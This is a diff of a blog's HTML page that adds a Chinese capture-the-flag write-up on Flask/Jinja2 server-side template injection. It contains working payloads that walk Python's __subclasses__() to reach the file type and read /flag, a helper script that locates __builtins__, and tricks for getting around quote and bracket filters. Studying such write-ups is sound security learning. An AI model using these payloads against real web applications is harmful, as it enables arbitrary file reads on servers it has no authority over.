&apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;Struct&apos;&gt;, &lt;type &apos;_json.Scanner&apos;&gt;, &lt;type &apos;_json.Encoder&apos;&gt;, &lt;class &apos;json.decoder.JSONDecoder&apos;&gt;, &lt;class &apos;json.encoder.JSONEncoder&apos;&gt;, &lt;type &apos;time.struct_time&apos;&gt;, &lt;class &apos;threading._Verbose&apos;&gt;, &lt;type &apos;cPickle.Unpickler&apos;&gt;, &lt;type &apos;cPickle.Pickler&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;_ssl._SSLContext&apos;&gt;, &lt;type &apos;_ssl._SSLSocket&apos;&gt;, &lt;class &apos;socket._closedsocket&apos;&gt;, &lt;type &apos;_socket.socket&apos;&gt;, &lt;type &apos;method_descriptor&apos;&gt;, &lt;class &apos;socket._socketobject&apos;&gt;, &lt;class &apos;socket._fileobject&apos;&gt;, &lt;class &apos;urlparse.ResultMixin&apos;&gt;, &lt;class &apos;contextlib.GeneratorContextManager&apos;&gt;, &lt;class &apos;contextlib.closing&apos;&gt;, &lt;class &apos;jinja2.utils.MissingType&apos;&gt;, &lt;class &apos;jinja2.utils.LRUCache&apos;&gt;, &lt;class &apos;jinja2.utils.Cycler&apos;&gt;, &lt;class &apos;jinja2.utils.Joiner&apos;&gt;, &lt;class &apos;jinja2.utils.Namespace&apos;&gt;, &lt;class &apos;markupsafe._MarkupEscapeHelper&apos;&gt;, &lt;class &apos;jinja2.nodes.EvalContext&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;class &apos;jinja2.nodes.Node&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;class &apos;jinja2.runtime.TemplateReference&apos;&gt;, &lt;class &apos;numbers.Number&apos;&gt;, &lt;class &apos;jinja2.runtime.Context&apos;&gt;, &lt;class &apos;jinja2.runtime.BlockReference&apos;&gt;, &lt;class &apos;jinja2.runtime.LoopContextBase&apos;&gt;, &lt;class &apos;jinja2.runtime.LoopContextIterator&apos;&gt;, &lt;class &apos;jinja2.runtime.Macro&apos;&gt;, &lt;class &apos;jinja2.runtime.Undefined&apos;&gt;, &lt;class &apos;decimal.Decimal&apos;&gt;, &lt;class &apos;decimal._ContextManager&apos;&gt;, &lt;class &apos;decimal.Context&apos;&gt;, &lt;class &apos;decimal._WorkRep&apos;&gt;, &lt;class &apos;decimal._Log10Memoize&apos;&gt;, &lt;type &apos;_ast.AST&apos;&gt;, &lt;class &apos;jinja2.lexer.Failure&apos;&gt;, &lt;class &apos;jinja2.lexer.TokenStreamIterator&apos;&gt;, &lt;class &apos;jinja2.lexer.TokenStream&apos;&gt;, &lt;class &apos;jinja2.lexer.Lexer&apos;&gt;, &lt;class &apos;jinja2.parser.Parser&apos;&gt;, &lt;class &apos;jinja2.visitor.NodeVisitor&apos;&gt;, &lt;class &apos;jinja2.idtracking.Symbols&apos;&gt;, &lt;class &apos;jinja2.compiler.MacroRef&apos;&gt;, &lt;class &apos;jinja2.compiler.Frame&apos;&gt;, &lt;class &apos;jinja2.environment.Environment&apos;&gt;, &lt;class &apos;jinja2.environment.Template&apos;&gt;, &lt;class &apos;jinja2.environment.TemplateModule&apos;&gt;, &lt;class &apos;jinja2.environment.TemplateExpression&apos;&gt;, &lt;class &apos;jinja2.environment.TemplateStream&apos;&gt;, &lt;class &apos;jinja2.loaders.BaseLoader&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;class &apos;jinja2.bccache.Bucket&apos;&gt;, &lt;class &apos;jinja2.bccache.BytecodeCache&apos;&gt;, &lt;class &apos;logging.LogRecord&apos;&gt;, &lt;class &apos;logging.Formatter&apos;&gt;, &lt;class &apos;logging.BufferingFormatter&apos;&gt;, &lt;class &apos;logging.Filter&apos;&gt;, &lt;class &apos;logging.Filterer&apos;&gt;, &lt;class &apos;logging.PlaceHolder&apos;&gt;, &lt;class &apos;logging.Manager&apos;&gt;, &lt;class &apos;logging.LoggerAdapter&apos;&gt;, &lt;type &apos;datetime.date&apos;&gt;, &lt;type &apos;datetime.timedelta&apos;&gt;, &lt;type &apos;datetime.time&apos;&gt;, &lt;type &apos;datetime.tzinfo&apos;&gt;, &lt;class &apos;werkzeug._internal._Missing&apos;&gt;, &lt;class &apos;werkzeug._internal._DictAccessorProperty&apos;&gt;, &lt;class &apos;werkzeug.datastructures.ImmutableListMixin&apos;&gt;, &lt;class &apos;werkzeug.datastructures.ImmutableDictMixin&apos;&gt;, &lt;class &apos;werkzeug.datastructures.UpdateDictMixin&apos;&gt;, &lt;class &apos;werkzeug.datastructures.ViewItems&apos;&gt;, &lt;class &apos;werkzeug.datastructures._omd_bucket&apos;&gt;, &lt;class &apos;werkzeug.datastructures.Headers&apos;&gt;, &lt;class &apos;werkzeug.datastructures.ImmutableHeadersMixin&apos;&gt;, &lt;class &apos;werkzeug.datastructures.IfRange&apos;&gt;, &lt;class &apos;werkzeug.datastructures.Range&apos;&gt;, &lt;class &apos;werkzeug.datastructures.ContentRange&apos;&gt;, &lt;class &apos;werkzeug.datastructures.FileStorage&apos;&gt;, &lt;class &apos;email.LazyImporter&apos;&gt;, &lt;class &apos;calendar.Calendar&apos;&gt;, &lt;class &apos;werkzeug.urls.Href&apos;&gt;, &lt;class &apos;werkzeug.utils.HTMLBuilder&apos;&gt;, &lt;class &apos;werkzeug.wrappers.accept.AcceptMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.auth.AuthorizationMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.auth.WWWAuthenticateMixin&apos;&gt;, &lt;class &apos;werkzeug.wsgi.ClosingIterator&apos;&gt;, &lt;class &apos;werkzeug.wsgi.FileWrapper&apos;&gt;, &lt;class &apos;werkzeug.wsgi._RangeWrapper&apos;&gt;, &lt;class &apos;werkzeug.middleware.dispatcher.DispatcherMiddleware&apos;&gt;, &lt;class &apos;werkzeug.middleware.http_proxy.ProxyMiddleware&apos;&gt;, &lt;class &apos;werkzeug.middleware.shared_data.SharedDataMiddleware&apos;&gt;, &lt;class &apos;werkzeug.formparser.FormDataParser&apos;&gt;, &lt;class &apos;werkzeug.formparser.MultiPartParser&apos;&gt;, &lt;class &apos;werkzeug.wrappers.base_request.BaseRequest&apos;&gt;, &lt;class &apos;werkzeug.wrappers.base_response.BaseResponse&apos;&gt;, &lt;class &apos;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.etag.ETagRequestMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.etag.ETagResponseMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.user_agent.UserAgentMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.request.StreamOnlyMixin&apos;&gt;, &lt;class &apos;werkzeug.wrappers.response.ResponseStream&apos;&gt;, &lt;class &apos;werkzeug.wrappers.response.ResponseStreamMixin&apos;&gt;, &lt;class &apos;werkzeug.exceptions.Aborter&apos;&gt;, &lt;class &apos;uuid.UUID&apos;&gt;, &lt;type &apos;CArgObject&apos;&gt;, &lt;type &apos;_ctypes.CThunkObject&apos;&gt;, &lt;type &apos;_ctypes._CData&apos;&gt;, &lt;type &apos;_ctypes.CField&apos;&gt;, &lt;type &apos;_ctypes.DictRemover&apos;&gt;, &lt;class &apos;ctypes.CDLL&apos;&gt;, &lt;class &apos;ctypes.LibraryLoader&apos;&gt;, &lt;class &apos;itsdangerous._json._CompactJSON&apos;&gt;, &lt;class &apos;itsdangerous.signer.SigningAlgorithm&apos;&gt;, &lt;class &apos;itsdangerous.signer.Signer&apos;&gt;, &lt;class &apos;itsdangerous.serializer.Serializer&apos;&gt;, &lt;class &apos;itsdangerous.url_safe.URLSafeSerializerMixin&apos;&gt;, &lt;class &apos;flask._compat._DeprecatedBool&apos;&gt;, &lt;class &apos;werkzeug.local.Local&apos;&gt;, &lt;class &apos;werkzeug.local.LocalStack&apos;&gt;, &lt;class &apos;werkzeug.local.LocalManager&apos;&gt;, &lt;class &apos;werkzeug.local.LocalProxy&apos;&gt;, &lt;class &apos;ast.NodeVisitor&apos;&gt;, &lt;class &apos;difflib.HtmlDiff&apos;&gt;, &lt;class &apos;werkzeug.routing.RuleFactory&apos;&gt;, &lt;class &apos;werkzeug.routing.RuleTemplate&apos;&gt;, &lt;class &apos;werkzeug.routing.BaseConverter&apos;&gt;, &lt;class &apos;werkzeug.routing.Map&apos;&gt;, &lt;class &apos;werkzeug.routing.MapAdapter&apos;&gt;, &lt;class &apos;click._compat._FixupStream&apos;&gt;, &lt;class &apos;click._compat._AtomicFile&apos;&gt;, &lt;class &apos;click.utils.LazyFile&apos;&gt;, &lt;class &apos;click.utils.KeepOpenFile&apos;&gt;, &lt;class &apos;click.utils.PacifyFlushWrapper&apos;&gt;, &lt;class &apos;click.types.ParamType&apos;&gt;, &lt;class &apos;click.parser.Option&apos;&gt;, &lt;class &apos;click.parser.Argument&apos;&gt;, &lt;class &apos;click.parser.ParsingState&apos;&gt;, &lt;class &apos;click.parser.OptionParser&apos;&gt;, &lt;class &apos;click.formatting.HelpFormatter&apos;&gt;, &lt;class &apos;click.core.Context&apos;&gt;, &lt;class &apos;click.core.BaseCommand&apos;&gt;, &lt;class &apos;click.core.Parameter&apos;&gt;, &lt;class &apos;flask.signals.Namespace&apos;&gt;, &lt;class &apos;flask.signals._FakeSignal&apos;&gt;, &lt;class &apos;flask.helpers.locked_cached_property&apos;&gt;, &lt;class &apos;flask.helpers._PackageBoundObject&apos;&gt;, &lt;class &apos;flask.cli.DispatchingApp&apos;&gt;, &lt;class &apos;flask.cli.ScriptInfo&apos;&gt;, &lt;class &apos;flask.config.ConfigAttribute&apos;&gt;, &lt;class &apos;flask.ctx._AppCtxGlobals&apos;&gt;, &lt;class &apos;flask.ctx.AppContext&apos;&gt;, &lt;class &apos;flask.ctx.RequestContext&apos;&gt;, &lt;class &apos;flask.json.tag.JSONTag&apos;&gt;, &lt;class &apos;flask.json.tag.TaggedJSONSerializer&apos;&gt;, &lt;class &apos;flask.sessions.SessionInterface&apos;&gt;, &lt;class &apos;werkzeug.wrappers.json._JSONModule&apos;&gt;, &lt;class &apos;werkzeug.wrappers.json.JSONMixin&apos;&gt;, &lt;class &apos;flask.blueprints.BlueprintSetupState&apos;&gt;]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>仍然在40的地方发现了&lt;type ‘file’&gt;👌</p>
+</blockquote>
+<h5 id="第四步，构造文件读取"><a href="#第四步，构造文件读取" class="headerlink" title="第四步，构造文件读取"></a>第四步，构造文件读取</h5><p>我在题目环境里面尝试是可以的</p>
+<p><img src="https://i.loli.net/2019/09/07/KR7poDCGMatWkSX.png" alt="Snipaste_2019-09-07_13-55-13.png"></p>
+<p>但是payload会报错。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exploit=&#123;&#123;request.__class__.__mro__[1].__subclasses__()[40](request.args.file).read()&#125;&#125;&amp;file=/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/07/YiIR4FtPELxohgG.png" alt="Snipaste_2019-09-07_13-53-49.png"></p>
+<p>原来是request.args.file读取方式有问题。。。。但是文章里是这么用的。。。。😭</p>
+<p>经过自己一些尝试，可以用如下的方法获取参数值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.args.to_dict().values()[1]</span><br></pre></td></tr></table></figure>
+
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exploit=&#123;&#123;request.__class__.__mro__[1].__subclasses__()[40](request.args.to_dict().values()[1]).read()&#125;&#125;&amp;file=/flag</span><br></pre></td></tr></table></figure>
+
+<p>好把，突然恍然大悟，太久没接触flask，文章里写的没错。。。。request.args.file是在模板里面的用法，的确可以得到file的值，而我的方法是在python中的操作</p>
+<p>但是那个报错依旧无法解决。。。。</p>
+<p>那就换个方法=。=，用chr()拼接文件名</p>
+<p>需要先获取chr函数，写个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">num = 0</span><br><span class="line">for item in ().__class__.__mro__[1].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &apos;__builtins__&apos; in item.__init__.__globals__:</span><br><span class="line">             print num,item</span><br><span class="line">         num+=1</span><br><span class="line">    except:</span><br><span class="line">        print &apos;-&apos;</span><br><span class="line">        num+=1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>发现有好几个😂，取58 &lt;class ‘warnings.WarningMessage’&gt;为例</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[58].__init__.__globals__.__builtins__.chr</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/07/dIqtMW8UsuojDTf.png" alt="Snipaste_2019-09-07_15-49-18.png"></p>
+<p>我裂开了。。。。。。。</p>
+<p>突然看到pop()方法，把前面那种情况先给解决了。。。。。。再次裂开</p>
+<p>只需要构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__class__.__mro__[1].__subclasses__().pop(40)(request.args.file).read()&#125;&#125;&amp;file=/flag</span><br></pre></td></tr></table></figure>
+
+<p>失败!!!</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[40]</span><br></pre></td></tr></table></figure>
+
+<p>成功（自己写的）</p>
+<blockquote>
+<p>但是还是很奇怪，用request构造题目python环境中测试是可以的，猜测是在flask中由于传入了值导致request模块变了=。=😱以后还是用()把。。。</p>
+<p>但是对于单引号过滤算是解决了。</p>
+<p><img src="https://i.loli.net/2019/09/07/v3FzBVYSKuCcm9r.png" alt="Snipaste_2019-09-07_16-14-12.png"></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)</span><br></pre></td></tr></table></figure>
+
+<p>成功（参考资料，这里是用来针对过滤中括号[]）</p>
+<p>还剩chr()函数没获取成功，获取成功后如下操作即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set chr()=().__class__.__mro__[1].__subclasses__()[40]</span><br><span class="line">__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__mro__[1].__subclasses__()[40](chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a></p>
+<p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
+<p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>
+
       
 
       
@@ -250,11 +404,7 @@ doDecrypt(passwd, onError);
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">cbc字节翻转攻击</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SSTI</a>
         		</li>
       		
 		</ul>
@@ -310,7 +460,7 @@ doDecrypt(passwd, onError);
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/23/Hacker101-Encrypted-Pastebin/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/07/flask模版注入/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -324,18 +474,9 @@ doDecrypt(passwd, onError);
   
 <nav id="article-nav">
   
-    <a href="/2019/08/24/php留言板设计/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          php留言板设计
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/08/22/内网穿透工具/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">内网穿透工具</div>
+    <a href="/2019/09/06/重装服务器/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">重装服务器</div>
       <i class="icon-circle-right"></i>
     </a>
   
